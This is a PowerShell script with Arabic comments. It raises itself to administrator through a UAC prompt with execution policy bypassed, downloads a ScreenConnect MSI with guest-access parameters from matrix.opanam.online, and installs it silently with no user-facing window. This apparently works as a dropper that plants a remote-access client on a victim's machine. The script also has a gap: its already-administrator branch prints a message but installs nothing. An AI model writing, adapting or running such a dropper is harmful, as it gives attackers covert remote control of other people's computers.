# ============================================
#  Self-Elevation: يشتغل حتى لو الكود اتنفذ كنص
# ============================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "Requesting administrator privileges..."

    # كود السكربت اللي هيشتغل بصلاحيات Admin
    $elevatedScript = @'
# ===== السكربت بصلاحيات Admin =====
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"

function Try-Download {
    param($Dir)
    if (-not (Test-Path $Dir)) { Write-Host "Dir '$Dir' not found."; return $null }
    $target = Join-Path $Dir $FileName
    try {
        Write-Host "Trying: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop
        if (-not (Test-Path $target)) { throw "File missing." }
        $size = (Get-Item $target).Length
        Write-Host "Size: $size bytes"
        if ($size -lt 100KB) { throw "Too small." }
        return $target
    } catch {
        Write-Host "Failed: $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

$MsiPath = Try-Download -Dir $PrimaryDir
if (-not $MsiPath) { $MsiPath = Try-Download -Dir $FallbackDir }
if (-not $MsiPath) { Write-Host "ERROR: Download failed."; exit 1 }

Write-Host "MSI: $MsiPath"

# التحقق من التوقيع
$bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
$signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
if ($signature -ne "D0CF11E0") {
    Write-Host "ERROR: Not a valid MSI. Signature: $signature"
    exit 1
}
Write-Host "File signature OK."

$LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName

Write-Host "Installing silently..."
$arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
$proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $arguments -Wait -PassThru -NoNewWindow
Write-Host "ExitCode: $($proc.ExitCode)"

if ($proc.ExitCode -eq 0 -or $proc.ExitCode -eq 3010) {
    Write-Host "SUCCESS: ScreenConnect installed."
    exit 0
} else {
    Write-Host "FAILED. Log: $LogPath"
    exit $proc.ExitCode
}
# ===== نهاية السكربت =====
'@

    # نحفظ السكربت في ملف مؤقت
    $tempScript = Join-Path $env:TEMP "SC_Elevated_$(Get-Random).ps1"
    Set-Content -Path $tempScript -Value $elevatedScript -Encoding UTF8

    Write-Host "Saved elevated script to: $tempScript"

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`""
        $psi.Verb            = "RunAs"
        $psi.UseShellExecute = $true

        Write-Host "Triggering UAC prompt..."
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit()

        Write-Host "Elevated process exited with code: $($proc.ExitCode)"

        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        exit $proc.ExitCode
    }
    catch {
        Write-Host "ERROR: UAC refused or failed: $($_.Exception.Message)"
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        exit 1
    }
}

# لو وصلنا هنا يبقى إحنا أصلاً Admin
Write-Host "Already running as Administrator. Proceeding with install..."
